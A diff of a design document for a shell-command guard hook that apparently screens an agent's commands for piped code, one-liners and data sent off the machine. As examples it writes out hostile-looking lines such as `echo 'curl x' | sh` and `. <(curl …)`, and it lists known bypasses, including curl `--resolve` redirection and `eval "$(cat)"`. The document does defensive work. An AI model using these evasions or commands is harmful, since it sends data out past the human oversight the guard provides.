@@ -389,7 +389,7 @@ command, inside the hook client's 0.5 s wait, so two limits keep a hook short. W
 read, it may ask for at most 200 units of matching work in all: a clause with path patterns 2, a
 pattern without `/` 1, a pattern with `/` 4 plus 12 for each `**` (an unanchored pattern has one
 more) plus 1 for each folder or name past the fourth, a clause with `path_scope` 2 (V5c), R1's
-`after` twice because it runs twice. The packaged default uses 31, `example.toml` 107. When a hook
+`after` twice because it runs twice. The packaged default uses 31, `example.toml` 119. When a hook
 runs, the work that grows with the command, floating folder patterns (one that may start at any
 folder, such as `secrets/**`), command-list entries (a `--name*` entry once for each long flag of
 the command it may match) and the `pipe_into` walk (one step for each link it follows), shares one
@@ -561,15 +561,26 @@ computer is blocked. After normalisation that covers:
   `ruby --version` are not one-liners;
 - code piped into an interpreter or a shell (V5c): `python`, `node`, `perl`,
   `ruby`, `sh`, `bash`, `zsh`, `dash` or `ksh` (versioned names too) at the start
-  of a pipe stage, or after a wrapper there (`| sudo bash`, `| env A=1 python3`),
-  or inside `>(…)`, that names no script, so it runs what comes in:
-  `echo 'print(1)' | python3`, `cat a.rb | ruby`, `echo 'curl x' | sh`, also
-  with `-`, `/dev/stdin`, `/dev/fd/N`, a shell's `-s`, or input from `< <(…)`.
-  A shell's `-c` whose script holds `$(…)` or backticks counts too
-  (`echo x | bash -c "$(cat)"`). A script word, `-m MODULE` or `< file` names a
-  script: `git diff | python3 tool.py`, `cat x.json | python3 -m json.tool` and
-  `python3 < x.py` are not one-liners, nor is `echo hi | grep h` or
-  `ps aux | grep python3` (`python3` is a word there, not the program);
+  of a pipe stage, or after a wrapper there (`| sudo bash`, `| env A=1 python3`,
+  `| uv run python`, `| bundle exec ruby`), or inside `>(…)`, that names no
+  script, so it runs what comes in: `echo 'print(1)' | python3`,
+  `cat a.rb | ruby`, `echo 'curl x' | sh`, also with `-`, `/dev/stdin`,
+  `/dev/fd/N`, a shell's `-s`, or input from `< <(…)`, `< /dev/stdin` or `<&0`
+  (a redirect of another descriptor, `3</dev/null` or `2>&1`, leaves the pipe as
+  stdin). A shell's `-c` whose script holds `$(…)` or backticks, or itself reads
+  the pipe, counts too (`echo x | bash -c "$(cat)"`, `echo x | sh -c python3`).
+  A script word, `-m MODULE` or `< file` names a script: `git diff | python3
+  tool.py`, `cat x.json | python3 -m json.tool` and `python3 < x.py` are not
+  one-liners, nor is `echo hi | grep h` or `ps aux | grep python3` (`python3` is
+  a word there, not the program). After a wrapper (`sudo`, `env`, `xargs`,
+  `timeout`, `nice`, … and the runners `uv`, `npx`, `bundle`, …) whose program
+  is plainly the next word, only that word is a program, and so on down a chain
+  of wrappers (`env` and `sudo` assignments, `timeout`'s duration and a runner's
+  `run` or `exec` are skipped): `git ls-files | xargs grep -l node` and
+  `cat x | sudo grep python` are not one-liners. With an option in between, or
+  after `parallel`, every later word counts as a program: `| xargs -0 grep -l sh`
+  and `| sudo -u bob python3` are (owner 2026-10-23). Rule 14's `pipe_into`
+  keeps every word after a wrapper;
 - a command that cannot be parsed (an unbalanced quote, or a `<<EOF` block);
 - the same tools inside a wrapper.
 
@@ -972,7 +983,8 @@ token is never treated as an allow.
   `rsync`, `git push`, `gh`, `aws`, every inline `python -c` / `node -e` /
   `perl -e` / `ruby -e` one-liner (whatever it contains; the forms section 5
   lists), code piped into an interpreter or a shell (`echo 'print(1)' | python3`,
-  `echo 'curl x' | sh`, `python3 < <(cat x)`; section 5, V5c),
+  `echo 'curl x' | sh`, `python3 < <(cat x)`, `| xargs -0 grep -l sh`, but not
+  `| xargs grep -l node`; section 5, V5c),
   and the same commands wrapped in `bash -c`, `env` or `sudo`. A line of more
   than 1,000 pipe stages, or more than 20,000 quoted words when it names `perl`,
   is denied unread. Sending to your own computer (`localhost`, private
@@ -1163,22 +1175,32 @@ Other measures:
     `. <(curl …)` (`.` is not in rule 14's list; `source` is);
   - curl's own abbreviations of long options (`--data-b`), which older curl
     releases accept (wget's are entries of their own);
+  - curl's `--resolve` and `--connect-to` with an address
+    (`curl -d @f --resolve localhost:80:203.0.113.5 http://localhost` sends to
+    that address): rule 5 and R1 read the URL's host only;
   - a private key with a name of its own, read by a relative path (`cat mykey`
     in `~/.ssh`): rule 1 knows the default key names only.
-- False alarms the same fields raise, toward firing: `curl -d "$BODY"
-  http://localhost:3000` fires rule 5 (a `$` in the matched command counts as an
-  unknown host; reading where a host may stand would need each option's
+- False alarms the same fields raise, toward firing: `curl -XGET x.example`
+  fires rule 5 (a cluster's letters are flags, so `-XGET` holds `-T`);
+  `curl -d "$BODY" http://localhost:3000` fires rule 5 (a `$` in the matched
+  command counts as an unknown host; reading where a host may stand would need each option's
   arguments, and `curl -d @f -s "$URL" localhost` sends to `$URL`); `rsync -a
   out.txt localhost:/tmp` fires rule 4 after a secret read (`out.txt` looks like a
   host name, `looks_like_host_token`); a path that differs from a workspace
   folder in letter case (`/Work/app/f` under `/work/app`) is outside for rule 8,
   though the Mac's disk ignores case.
 - Piped code (section 5), after a mark and in the offline guard: after a wrapper
-  every word counts as a program, so `cat x | xargs grep sh` is denied; so is
+  with an option, or after `parallel`, every word counts as a program, so
+  `cat x | xargs -0 grep sh` is denied (owner 2026-10-23); so is
   `ls | bash -c "wc -l $(pwd)"`, a fed shell whose `-c` script holds a
   substitution. The offline guard reads each pipe stage with a regular
   expression, which costs about 150 ms more per MiB of text made of pipes; past
-  its caps (section 9) it denies.
+  its caps (section 9) it denies. It reads a quoted `|` as a pipe on purpose (to
+  see into `bash -c '…'`), so `grep -E 'x|python'` is denied offline.
+- What piped code does not see, after a mark and offline: `source /dev/stdin`
+  and `eval "$(cat)"` fed by a pipe (`source` and `eval` are not in section 5's
+  list; rule 14 lists them as shells), and, offline only, a compound command
+  after the `|` (`| if true; then python3; fi`), which the recorder sees.
 
 ---
 
